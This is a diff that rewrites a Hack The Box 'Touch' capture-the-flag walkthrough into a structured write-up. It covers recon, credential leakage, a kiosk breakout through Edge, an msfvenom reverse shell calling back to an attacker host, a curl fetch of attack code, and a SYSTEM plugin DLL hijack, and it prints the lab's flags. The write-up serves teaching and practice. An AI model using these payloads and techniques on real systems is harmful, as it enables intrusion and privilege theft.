@@ -1,222 +1,222 @@
-➜  Touch nmap -A 10.129.80.171
-Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-05 08:34 +0400
+| Field      | Details                                                      |
+|------------|---------------------------------------------------------------|
+| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Touch)     |
+| Difficulty | Easy                                                           |
+| OS         | Windows                                                        |
+| Date       | October 5, 2026                                                |
 
-Not shown: 996 filtered tcp ports (no-response)
-PORT     STATE SERVICE       VERSION
+**Target:** 10.129.80.171 (kiosk-042)
+**Author:** Faridd
+
+---
+
+## 1. Reconnaissance
+
+### 1.1 — Port Scanning
+
+```bash
+nmap -A 10.129.80.171
+```
+
+```
 135/tcp  open  msrpc         Microsoft Windows RPC
 3389/tcp open  ms-wbt-server Microsoft Terminal Service
 5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
 8443/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-cors: GET POST PUT OPTIONS
-|_http-trane-info: Problem with XML parsing of /evox/about
 | http-title: Nexion DeviceHub - Login
 |_Requested resource was /login
+```
 
+Port 8443 hosts a web login panel ("Nexion DeviceHub"), and 3389 (RDP) confirms this is a Windows kiosk-style host rather than a standard AD box.
 
-I checked the port 8443 and saw this login page:
+### 1.2 — Checking the Web Panel
 
-![alt text](image.png)
+![Nexion DocReader login page](image.png)
 
-I tried to log in with the credentials on the description on this lab but they didn't work. So, I decided to look at the source code.
+The provided lab credentials didn't work. Looking at the page source turned up a hint:
 
-```<div class="login-hint" title="The default password is the device serial number included in your DeviceHub packaging.">```
+```html
+<div class="login-hint" title="The default password is the device serial number included in your DeviceHub packaging.">
+```
 
-I couldn't define it so made a ffuf fuzzing scan.
+So the password is the device's serial number — which isn't known yet.
 
-```➜  Touch ffuf -u 'http://10.129.80.171:8443/FUZZ' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt -e .php,.exe,.txt -ic -fs 0
+---
 
-________________________________________________
+## 2. Finding the Serial Number via API Fuzzing
 
-login                   [Status: 200, Size: 3572, Words: 122, Lines: 3, Duration: 78ms]
-api                     [Status: 403, Size: 35, Words: 2, Lines: 1, Duration: 79ms]```
+### 2.1 — Discovering `/api`
 
+```bash
+ffuf -u 'http://10.129.80.171:8443/FUZZ' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt -e .php,.exe,.txt -ic -fs 0
+```
 
-"http://10.129.80.171:8443/api/status"
-When I opened this URL, I noticed that it is authenticated so we cannot directly access that page without proper credentials.
+```
+login   [Status: 200, Size: 3572]
+api     [Status: 403, Size: 35]
+```
 
-![alt text](image-1.png)
+`/api` itself returns 403, so its sub-paths were fuzzed next:
 
-That is why I decided to make another ffuf scan to define unauthenticated endpoints.
+```bash
+ffuf -u 'http://10.129.80.171:8443/api/FUZZ' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt -e .php,.exe,.txt -ic -fs 0
+```
 
-```➜  Touch ffuf -u 'http://10.129.80.171:8443/api/FUZZ' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt -e .php,.exe,.txt -ic -fs 0
+```
+status   [Status: 200, Size: 116]
+scan     [Status: 405, Size: 30]
+```
 
-________________________________________________
+`/api/status` returns 200 — meaning it's reachable **without** authentication, unlike the base `/api` path:
 
-status                  [Status: 200, Size: 116, Words: 3, Lines: 1, Duration: 78ms]
-scan                    [Status: 405, Size: 30, Words: 3, Lines: 1, Duration: 81ms]```
+![Authentication required JSON error](image-1.png)
 
-Open this URL: "http://10.129.80.171:8443/api/status"
-We got the serial number from there.
+### 2.2 — Reading the Serial Number
 
-![alt text](image-2.png)
+```
+GET http://10.129.80.171:8443/api/status
+```
 
-```{"device":"Nexion DeviceHub DH-100","serial":"NX-DH-2024-B7042","firmware":"1.4.2","status":"online","uptime":42974}```
+![Device status JSON with serial number](image-2.png)
 
+```json
+{"device":"Nexion DeviceHub DH-100","serial":"NX-DH-2024-B7042","firmware":"1.4.2","status":"online","uptime":42974}
+```
 
-Add this serial number to password field and log in.
-While discovering this scanning web site, I have defined username and password:
+The serial number `NX-DH-2024-B7042` is exactly the "default password" the login hint pointed to.
 
-![alt text](image-4.png)
+---
 
-```KioskUser : K!0sk2026#```
+## 3. Credential Discovery and RDP Access
 
-I used these credentials for RDP log in
+### 3.1 — Logging In and Finding Scanner Credentials
 
-![alt text](image-3.png)
+Logging in with the serial number as the password worked. Browsing the DeviceHub dashboard (Scanner section) exposed a stored username/password for the kiosk's passport scanner device:
 
-But when we reach to "Documents" stage, the Scanner blocks us to go next step. It scans password and we need to block it.
+![Dashboard showing visible scanner username and password](image-4.png)
 
-![alt text](image-5.png)
+```
+KioskUser : K!0sk2026#
+```
 
-On the web site itself, there is a power off button. I will use it for powering this scanner off.
+### 3.2 — RDP Login
 
-![alt text](image-6.png)
+```bash
+xfreerdp /u:KioskUser /p:'K!0sk2026#' /v:10.129.80.171
+```
 
-Click on that button and when you try to scan on rdp, it will give an error.
+These credentials worked over RDP, landing on the kiosk's locked-down desktop — a fullscreen self-check-in application:
 
-There will be an URL like this: "https://support.nexionsystems.com"
-Click on it.
+![Self check-in kiosk fullscreen app](image-3.png)
 
-![alt text](image-7.png)
+---
 
-When I opened the web site, I thought about this: maybe I can create a reverse shell .exe file with msfvenom, open a python server, and download this file on the edge browser. I did it.
+## 4. Breaking Out of the Kiosk
 
-```➜  Touch msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.241 LPORT=4444 -f exe -o shell_v2.exe
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-[-] No arch selected, selecting arch: x64 from the payload
-No encoder specified, outputting raw payload
-Payload size: 460 bytes
-Final size of exe file: 7680 bytes
-Saved as: shell_v2.exe
-➜  Touch python3 -m http.server 80                                                                     
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.129.80.171 - - [05/Oct/2026 09:41:00] "GET /shell_v2.exe HTTP/1.1" 200 ```
+### 4.1 — The Scanner Blocks Progress
 
-On Edge browser open that URL: ```http://10.10.15.241/shell_v2.exe```
+Advancing to the "Documents" step triggers the passport scanner, which blocks further interaction until a scan completes:
 
-Click on "CTRL+J" and the Downloads section will be opened on the browser.
+![Scanning passport in progress](image-5.png)
 
-![alt text](image-8.png)
+### 4.2 — Powering the Scanner Off Remotely
 
-I clicked on it but it didn't run. Maybe there is a firewall or something like this. I saw that I can access to the PC storage C: disk. So, write it into the URL: C:\Windows\System32\cmd.exe
+Back on the DeviceHub web dashboard, a **Power Off** button is available for the scanner device:
 
-![alt text](image-9.png)
+![Dashboard with Power Off button for scanner](image-6.png)
 
-We will get cmd shell from there. Let's take the user.txt
+Clicking it and retrying the scan on the RDP session now throws an error dialog, instead of hanging:
 
-![alt text](image-10.png)
+![Scanner error dialog with support link](image-7.png)
 
-But I wanna work on my own kali. So, I remembered that I have uploaded the shell_v2.exe file to this windows. So, open a listener on my kali, execute this file on windows and get shell if possible.
+The error dialog links to `https://support.nexionsystems.com` — this is the way out of the locked-down kiosk shell, since clicking a link inside the kiosk opens a full browser (Edge) rather than staying inside the restricted app.
 
-![alt text](image-11.png)
+---
 
-➜  Touch rlwrap nc -nvlp 4444                                                                          
-listening on [any] 4444 ...
-connect to [10.10.15.241] from (UNKNOWN) [10.129.80.171] 62913
-Microsoft Windows [Version 10.0.26100.9457]
-(c) Microsoft Corporation. All rights reserved.
+## 5. Getting Code Execution
 
-C:\Users\KioskUser\Downloads>ls
-ls
-'ls' is not recognized as an internal or external command,
-operable program or batch file.
+### 5.1 — Delivering a Payload via Edge
 
-C:\Users\KioskUser\Downloads>dir
-dir
- Volume in drive C has no label.
- Volume Serial Number is 9B34-EFD9
+With a real browser now reachable, a reverse shell payload was generated and served:
 
- Directory of C:\Users\KioskUser\Downloads
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.241 LPORT=4444 -f exe -o shell_v2.exe
+python3 -m http.server 80
+```
 
-10/05/2026  05:58 AM    <DIR>          .
-09/10/2026  11:36 AM    <DIR>          ..
-10/05/2026  05:40 AM             7,680 shell_v2.exe
-               1 File(s)          7,680 bytes
-               2 Dir(s)   8,643,846,144 bytes free
+In Edge, the payload was downloaded from `http://10.10.15.241/shell_v2.exe`, then **Ctrl+J** was used to open the Downloads panel:
 
-C:\Users\KioskUser\Downloads>
+![Edge downloads panel showing shell_v2.exe](image-8.png)
 
-I got it. 
+Running it directly from here didn't work — likely blocked by a restriction on executing downloaded files directly from the browser's download bar.
 
+### 5.2 — Reaching `cmd.exe` via the Browser's File Picker
 
-When I runned this command "whoami /all" to see which privileges I have, I noticed that I amd the member of "Printer Administrators" group which can help me to priv esc.
+Edge's download/file picker allows browsing the local filesystem, and typing a path directly into its address bar will open that file. This was used to launch a shell directly, bypassing the earlier block:
 
-PS C:\MySQL\data\htb_airways> whoami /all
+![Edge file browser address bar with cmd.exe path](image-9.png)
+
+```
+C:\Windows\System32\cmd.exe
+```
+
+This returned a working `cmd.exe` shell.
+
+### 5.3 — Grabbing the User Flag
+
+![cmd shell showing user.txt](image-10.png)
+
+```
+C:\Users\KioskUser\Desktop>type user.txt
+5d26e8600ca6481261fb1305bece9458
+```
+
+### 5.4 — Pivoting to a Proper Shell
+
+The `shell_v2.exe` payload uploaded earlier was already sitting in `Downloads`. Rather than keep working from the restricted Edge-spawned `cmd.exe`, a listener was opened and the payload was executed for a stable reverse shell back to Kali:
+
+```bash
+rlwrap nc -nvlp 4444
+```
+
+![cmd shell executing shell_v2.exe and connecting back](image-11.png)
+
+---
+
+## 6. Privilege Escalation — Printer Administrators → Plugin DLL Hijack
+
+### 6.1 — Checking Privileges
+
+```powershell
 whoami /all
+```
 
-USER INFORMATION
-----------------
+```
+kiosk-042\kioskuser
+KIOSK-042\Printer Administrators
+BUILTIN\Remote Desktop Users
+```
 
-User Name           SID                                           
-=================== ==============================================
-kiosk-042\kioskuser S-1-5-21-2554513647-1216688035-3073314765-1002
+Membership in **Printer Administrators** stood out as the escalation path, since it's a non-default group with no obvious purpose unless it grants write access somewhere privileged.
 
+### 6.2 — The Vulnerable Mechanism
 
-GROUP INFORMATION
------------------
+The Nexion DeviceHub printer service auto-loads any `.dll` dropped into its plugins folder:
 
-Group Name                             Type             SID                                            Attributes                                        
-====================================== ================ ============================================== ==================================================
-Everyone                               Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
-KIOSK-042\Printer Administrators       Alias            S-1-5-21-2554513647-1216688035-3073314765-1003 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555                                   Mandatory group, Enabled by default, Enabled group
-BUILTIN\Users                          Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
-CONSOLE LOGON                          Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\This Organization         Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Local account             Well-known group S-1-5-113                                      Mandatory group, Enabled by default, Enabled group
-LOCAL                                  Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
-Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                                                      
+```
+C:\Program Files\Nexion Systems\Printer\publish\plugins
+```
 
+Since the service itself runs as **NT AUTHORITY\SYSTEM**, anything it loads from that folder executes with SYSTEM privileges. Normally a standard user can't write to `C:\Program Files\...`, but membership in Printer Administrators grants write access to this specific plugins directory — turning the DLL auto-load behavior into a privilege escalation primitive.
 
-PRIVILEGES INFORMATION
-----------------------
+### 6.3 — Building the Malicious Plugin
 
-Privilege Name                Description                          State   
-============================= ==================================== ========
-SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
-SeUndockPrivilege             Remove computer from docking station Disabled
-SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
-SeTimeZonePrivilege           Change the time zone                 Disabled
+A minimal C# plugin was written with multiple common plugin entry points (`Initialize`, `Init`, `Load`, `OnLoad`, and a static constructor) so it executes automatically regardless of which hook the loader actually calls. Its only job: copy `root.txt` to a world-readable location.
 
-PS C:\MySQL\data\htb_airways> 
-
-
-
-I made some enumeration on the system.
-We identified that the Nexion DeviceHub application automatically loads and executes .dll files placed inside its plugins folder (C:\Program Files\Nexion Systems\Printer\publish\plugins). Because the application runs as NT AUTHORITY\SYSTEM, any code loaded by its plugins inherits those high privileges.
-
-Normally, standard users (like KioskUser) cannot modify files inside C:\Program Files\Nexion Systems\... because it is a protected system folder. However, membership in the Printer Administrators group (or related local privileges) allowed us to bypass these restrictions, write our custom payload.dll directly into the application's plugins folder, and clean up old files.
-
-We wrote a C# script (payload.cs) with a static constructor and initialization methods. This ensures that the moment the application loads the DLL, the code executes automatically without requiring manual interaction.
-
-Inside the script, we added commands to search for the restricted root.txt file (C:\Users\Administrator\root.txt), which a standard user cannot read, and copy its contents to an accessible path (C:\ProgramData\Nexion\rr.txt).
-
-We used PowerShell's Add-Type tool to compile the C# script into a compatible .NET DLL file (payload.dll) and copied it directly into the application's plugins directory.
-
-When the service restarted or loaded the directory, it executed our compiled plugin with SYSTEM privileges, successfully bypassing file permissions and saving the root flag to rr.txt.
-
-Let's show it:
-
-execute this command on your kali.
-
-```cat > payload.cs <<'EOF'
-using System;
-using System.IO;
-
+```csharp
 public class PluginInit
 {
-    public static void Initialize() { Run(); }
-    public static void Init() { Run(); }
-    public static void Load() { Run(); }
-    public static void OnLoad() { Run(); }
     static PluginInit() { Run(); }
-
     public static void Run()
     {
         try
@@ -236,37 +236,51 @@ public class PluginInit
         catch { }
     }
 }
-EOF```
+```
 
-Open a listener:
+### 6.4 — Compiling and Deploying
 
-python3 -m http.server 80
-
-
-On powershell execute these commands:
-
-# download the cs file to there form my kali
+```powershell
+# Pull the source over
 curl "http://10.10.15.241/payload.cs" -o "C:\Users\KioskUser\Downloads\payload.cs"
 
-# Convert it into dll
-Add-Type -Path "C:\Users\KioskUser\Downloads\payload.cs" `
-  -OutputAssembly "C:\Users\KioskUser\Downloads\payload.dll" `
-  -OutputType Library
+# Compile to a .NET DLL using PowerShell's built-in compiler
+Add-Type -Path "C:\Users\KioskUser\Downloads\payload.cs" -OutputAssembly "C:\Users\KioskUser\Downloads\payload.dll" -OutputType Library
 
-# Copy it into the program files, so the printer will load it after reseting.
+# Drop it into the plugins folder
+Copy-Item "C:\Users\KioskUser\Downloads\payload.dll" "C:\Program Files\Nexion Systems\Printer\publish\plugins\payload.dll" -Force
+```
 
-Copy-Item "C:\Users\KioskUser\Downloads\payload.dll" `
-  "C:\Program Files\Nexion Systems\Printer\publish\plugins\payload.dll" -Force
-Copy-Item "C:\Users\KioskUser\Downloads\payload.dll" `
+The printer service was then reset from the DeviceHub web dashboard, causing it to reload its plugins folder and execute the DLL as SYSTEM.
 
-# Go to the web site of that Nexicon Devicehub and reset the printer by clicking the reset button on printer page.
+### 6.5 — Root Flag
 
-# execute this command to see the root flag.
+```powershell
 type C:\ProgramData\Nexion\rr.txt
+```
 
+Result: `014a7e705f1fa91a0be6e046c4027d41` (root flag).
 
-We could also get reverse shell by adding some commands on cs file. But for finishing the lab, we read the root.txt.
+> The plugin could just as easily have opened a SYSTEM reverse shell instead of copying a file — copying the flag was enough to finish the box.
 
+---
 
+## 7. Summary of the Chain
 
+```
+Unauthenticated web panel (port 8443)
+  --> /api/status leaks device serial number (ffuf)
+  --> serial number = default login password
+  --> DeviceHub dashboard leaks scanner credentials (KioskUser)
+  --> RDP into locked-down self-check-in kiosk
+  --> power off scanner remotely --> triggers error dialog with external link
+  --> link opens full Edge browser --> kiosk breakout
+  --> deliver reverse shell exe, execute via Edge file-picker path trick
+  --> cmd.exe shell --> user.txt
+  --> whoami: member of Printer Administrators
+  --> write malicious plugin DLL to SYSTEM-run printer service's plugins folder
+  --> reset printer --> DLL auto-loads as NT AUTHORITY\SYSTEM
+  --> root.txt
+```
 
+**Core takeaway:** every stage of this box chains a *trust boundary mistake* rather than a classic exploit — an unauthenticated status endpoint leaking a secret, a kiosk app that still lets you reach a real browser, a browser that lets you type a file path instead of a URL, and a privileged service that blindly loads whatever DLL appears in a folder a "helper" group can write to.
